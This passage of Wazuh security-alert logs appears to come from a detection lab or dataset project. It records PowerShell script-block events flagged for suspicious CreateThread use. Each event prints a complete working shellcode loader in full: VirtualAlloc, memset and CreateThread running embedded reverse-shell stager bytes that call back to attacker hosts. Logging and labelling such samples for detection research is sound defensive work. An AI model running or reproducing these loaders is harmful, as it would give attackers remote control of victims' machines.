e0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x95,0x68,0x02,0x00,0x15,0xb3,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"ae86dc93-8520-4fc1-b83f-64053d87ec69","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2095.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:34.223+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":101,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304374.2767659","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:54.7954735Z","eventRecordID":"145189","processID":"6160","threadID":"1920","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x95,0x58,0xce,0x5a,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: ef593fa8-109a-435e-852b-b9219521522f\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2096.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x95,0x58,0xce,0x5a,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"ef593fa8-109a-435e-852b-b9219521522f","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2096.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:35.715+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":102,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304375.2778608","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:55.6630918Z","eventRecordID":"145193","processID":"8448","threadID":"8456","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xf4,0x7e,0xae,0x9c,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x83,0xc2,0x04,0x03,0x7a,0xfb,0x9c,0x5b,0x60,0xeb,0xe3,0xa4,0x99,0xeb,0x83,0x2d,0x7c,0xda,0x83,0x4a,0xf4,0x4c,0x34,0x18,0x58,0x60,0xbf,0x4c,0x49,0xf3,0xcd,0x58,0x7e,0xb4,0x78,0xbf,0xb1,0x45,0xd0,0x83,0xd0,0xc5,0x2b,0xd0,0x32,0xf4,0xe3,0x25,0x32,0x31,0x19,0xc7,0x66,0xea,0x55,0x7a,0x97,0x9f,0x20,0x47,0x1c,0xd3,0xa5,0xcf,0xc1,0xa3,0xc4,0xfe,0x57,0xb8,0x9e,0x20,0x59,0x6d,0xab,0x68,0x41,0x72,0x96,0x23,0xfa,0x40,0x6c,0xb2,0x2a,0x99,0x8d,0x19,0x13,0x16,0x7c,0x63,0x53,0x90,0x9f,0x16,0xad,0xe3,0x22,0x21,0x6a,0x9e,0xf8,0xa4,0x69,0x38,0x8a,0x1f,0x56,0xb9,0x5f,0xf9,0x1d,0xb5,0x14,0x8d,0x7a,0xd9,0xab,0x42,0xf1,0xe5,0x20,0x65,0xd6,0x6c,0x72,0x42,0xf2,0x35,0x20,0xeb,0xa3,0x93,0x87,0x14,0xb3,0x7c,0x77,0xb1,0xbf,0x90,0x6c,0xc8,0x9d,0xfc,0x41,0xe1,0x1d,0xfc,0xcd,0x72,0x6d,0xce,0x52,0x29,0xf9,0x62,0x1a,0xf7,0xfe,0x85,0x31,0x4f,0x90,0x78,0xba,0xb0,0xb8,0xbe,0xee,0xe0,0xd2,0x17,0x8f,0x6a,0x23,0x98,0x5a,0x06,0x26,0x0e,0x37,0x86,0x16,0xb7,0xdf,0x2a,0x67,0x48,0x4e,0xa2,0x81,0x06,0xde,0xe4,0x1d,0xe6,0x8e,0x44,0xce,0x8e,0xc4,0x4a,0x31,0xae,0xe6,0x80,0x5a,0x44,0x09,0x7d,0x32,0xf0,0xb0,0x24,0xc8,0x61,0x3c,0xf3,0xb4,0xa1,0xb6,0xf0,0x49,0x6f,0x3f,0x7c,0x5a,0x07,0xcf,0xcb,0x00,0x81,0xd0,0xe1,0x2f,0x2d,0x45,0x0e,0xe6,0x7a,0xf1,0x0c,0xdf,0x4c,0x5e,0xee,0x0a,0xc7,0x57,0x7a,0xf5,0xbf,0x97,0x6a,0xf5,0x3f,0xce,0xe0,0xf5,0x57,0xb6,0x50,0xa6,0x42,0xb9,0x4c,0xda,0xdf,0x2c,0x6f,0x8b,0x8c,0xe7,0x07,0x31,0xeb,0xc0,0x87,0xca,0xde,0xd0,0xf4,0x1c,0x26,0xa7,0x14,0x9d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: e6c4e21f-6313-41e7-bc5b-1d3b9deec331\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2098.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xf4,0x7e,0xae,0x9c,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x83,0xc2,0x04,0x03,0x7a,0xfb,0x9c,0x5b,0x60,0xeb,0xe3,0xa4,0x99,0xeb,0x83,0x2d,0x7c,0xda,0x83,0x4a,0xf4,0x4c,0x34,0x18,0x58,0x60,0xbf,0x4c,0x49,0xf3,0xcd,0x58,0x7e,0xb4,0x78,0xbf,0xb1,0x45,0xd0,0x83,0xd0,0xc5,0x2b,0xd0,0x32,0xf4,0xe3,0x25,0x32,0x31,0x19,0xc7,0x66,0xea,0x55,0x7a,0x97,0x9f,0x20,0x47,0x1c,0xd3,0xa5,0xcf,0xc1,0xa3,0xc4,0xfe,0x57,0xb8,0x9e,0x20,0x59,0x6d,0xab,0x68,0x41,0x72,0x96,0x23,0xfa,0x40,0x6c,0xb2,0x2a,0x99,0x8d,0x19,0x13,0x16,0x7c,0x63,0x53,0x90,0x9f,0x16,0xad,0xe3,0x22,0x21,0x6a,0x9e,0xf8,0xa4,0x69,0x38,0x8a,0x1f,0x56,0xb9,0x5f,0xf9,0x1d,0xb5,0x14,0x8d,0x7a,0xd9,0xab,0x42,0xf1,0xe5,0x20,0x65,0xd6,0x6c,0x72,0x42,0xf2,0x35,0x20,0xeb,0xa3,0x93,0x87,0x14,0xb3,0x7c,0x77,0xb1,0xbf,0x90,0x6c,0xc8,0x9d,0xfc,0x41,0xe1,0x1d,0xfc,0xcd,0x72,0x6d,0xce,0x52,0x29,0xf9,0x62,0x1a,0xf7,0xfe,0x85,0x31,0x4f,0x90,0x78,0xba,0xb0,0xb8,0xbe,0xee,0xe0,0xd2,0x17,0x8f,0x6a,0x23,0x98,0x5a,0x06,0x26,0x0e,0x37,0x86,0x16,0xb7,0xdf,0x2a,0x67,0x48,0x4e,0xa2,0x81,0x06,0xde,0xe4,0x1d,0xe6,0x8e,0x44,0xce,0x8e,0xc4,0x4a,0x31,0xae,0xe6,0x80,0x5a,0x44,0x09,0x7d,0x32,0xf0,0xb0,0x24,0xc8,0x61,0x3c,0xf3,0xb4,0xa1,0xb6,0xf0,0x49,0x6f,0x3f,0x7c,0x5a,0x07,0xcf,0xcb,0x00,0x81,0xd0,0xe1,0x2f,0x2d,0x45,0x0e,0xe6,0x7a,0xf1,0x0c,0xdf,0x4c,0x5e,0xee,0x0a,0xc7,0x57,0x7a,0xf5,0xbf,0x97,0x6a,0xf5,0x3f,0xce,0xe0,0xf5,0x57,0xb6,0x50,0xa6,0x42,0xb9,0x4c,0xda,0xdf,0x2c,0x6f,0x8b,0x8c,0xe7,0x07,0x31,0xeb,0xc0,0x87,0xca,0xde,0xd0,0xf4,0x1c,0x26,0xa7,0x14,0x9d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"e6c4e21f-6313-41e7-bc5b-1d3b9deec331","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2098.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:36.724+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":103,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304376.2789917","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:56.5511539Z","eventRecordID":"145197","processID":"8632","threadID":"4080","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xeb,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 00027d7e-f7c0-422b-8ad6-6482efa3f02c\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2100.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xeb,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"00027d7e-f7c0-422b-8ad6-6482efa3f02c","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2100.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:36.795+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":104,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304376.2800922","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:57.3839214Z","eventRecordID":"145201","processID":"2032","threadID":"7144","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$daQY = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $daQY -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x2f,0x96,0xf9,0x11,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x4e,0x31,0x7e,0x14,0x03,0x7e,0x14,0x83,0xc6,0x04,0xcd,0x63,0x05,0xf9,0x93,0x8c,0xf6,0xfa,0xf3,0x05,0x13,0xcb,0x33,0x71,0x57,0x7c,0x83,0xf1,0x35,0x71,0x68,0x57,0xae,0x02,0x1c,0x70,0xc1,0xa3,0xaa,0xa6,0xec,0x34,0x86,0x9b,0x6f,0xb7,0xd4,0xcf,0x4f,0x86,0x17,0x02,0x91,0xcf,0x45,0xef,0xc3,0x98,0x02,0x42,0xf4,0xad,0x5e,0x5f,0x7f,0xfd,0x4f,0xe7,0x9c,0xb6,0x6e,0xc6,0x32,0xcc,0x29,0xc8,0xb5,0x01,0x42,0x41,0xae,0x46,0x6e,0x1b,0x45,0xbc,0x05,0x9a,0x8f,0x8c,0xe6,0x31,0xee,0x20,0x15,0x4b,0x36,0x86,0xc5,0x3e,0x4e,0xf4,0x78,0x39,0x95,0x86,0xa6,0xcc,0x0e,0x20,0x2d,0x76,0xeb,0xd0,0xe2,0xe1,0x78,0xde,0x4f,0x65,0x26,0xc3,0x4e,0xaa,0x5c,0xff,0xdb,0x4d,0xb3,0x89,0x9f,0x69,0x17,0xd1,0x44,0x13,0x0e,0xbf,0x2b,0x2c,0x50,0x60,0x94,0x88,0x1a,0x8d,0xc1,0xa0,0x40,0xda,0x26,0x89,0x7a,0x1a,0x20,0x9a,0x09,0x28,0xef,0